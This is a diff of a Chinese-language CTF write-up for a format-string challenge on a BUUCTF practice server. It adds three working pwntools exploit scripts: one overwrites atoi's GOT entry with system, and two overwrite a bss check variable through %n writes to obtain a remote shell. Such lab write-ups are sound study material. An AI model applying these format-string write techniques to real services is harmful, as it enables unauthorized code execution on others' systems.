@@ -314,6 +314,8 @@ aaaa %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
 <br>
 看出偏移量为10.
 
+***********************
+
 **解法1：使用pwntools的 fmtstr_payload 函数**(目前最理解的一种)<br>
 
 _原理：因为No PIE，可以直接格式化字符串篡改atoi为system。使用 fmtstr_payload 进行简化格式化字符串，通过替换atoi提前调用system，再手动输入/bin/sh获取shell。_
@@ -348,12 +350,17 @@ fmtstr_payload(偏移，{原地址：目的地址})
 ![image](https://github.com/xhsy0314/Task/assets/84487619/6e3dac22-a3a3-4cf3-86dd-e9e32d03623f)
 <br>
 
+也可以通过ELF查找
 **exp1：**
 ```
 from pwn import *
 							
-#p=process("./deadbeef")
 io=remote("node4.buuoj.cn",28012)
+
+#elf = ELF('./pwn5')
+#atoi_got = elf.got['atoi']
+#system_plt = elf.plt['system']
+
 atoi_got=0x0804C034
 sys_plt=0x08049080
 payload=fmtstr_payload(10,{atoi_got:sys_plt})
@@ -362,5 +369,75 @@ io.recv()
 io.sendline(payload)
 io.recv()
 io.sendline('/bin/sh\x00')
+io.interactive()
+```
+
+***************
+
+**解法2：**
+
+<br>
+需要用到 dword_804C044 地址0x0804C044。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/727c2707-7270-40b9-a0a0-3ead49e80acb)
+<br>
+
+利用偏移量10：
+
+		%10$n
+		用 %10$ 定位到这4个地址，从第十位偏移，也就是0x804C044开始到0x804C047
+		读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中
+		 
+		%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节
+
+**exp2：**
+```
+from pwn import*
+ 
+p =remote("node4.buuoj.cn",25976)
+elf = ELF('./pwn')
+bss_addr = 0x804C044
+ 
+payload = p32(bss_addr) + p32 (bss_addr + 1 ) + p32(bss_addr + 2) + p32(bss_addr + 3)
+payload2 = b'%10$n%11$n%12$n%13$n'
+#读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中
+ 
+p.sendline(payload+payload2)
+p.sendline(str(0x10101010))
+# 0x10101010  4 * len(p32(0x804C044)) = 0x10
+p.interactive()
+```
+关于0x10101010这里有点不理解。。。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/f29d9984-5c1d-47ea-9003-23857a2ffa0c)<br>
+
+
+*****
+
+**解法3：将 dword_804C044 修改为任意值**<br>
+
+_通过 fmtstr_payload 将 dword_804C044 的内容替换为0x1，而非随机数
+随后输入同样的值 0x1 即可通过if判断，获取shell。_
+<br>
+利用这里的比较，
+<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/02c9a959-29b1-4d07-b39e-d818eca27c91)
+<br>
+
+_将 dword_804C044 修改为任意值，然后再次输入此值即可获取shell_<br>
+
+比如将  dword_804C044 修改为 0x1:
+**exp3：**
+```
+from pwn import*
+ 
+io =remote("node4.buuoj.cn",25976)
+elf = ELF('./pwn')
+bss_addr = 0x804C044
+ 
+io.recv()
+payload = fmtstr_payload(10,{bss_addr:0x1})
+io.sendline(payload)
+io.recv()
+#这里注释掉这两个recv()也能运行
+io.sendline(str(0x1))
 io.interactive()
 ```
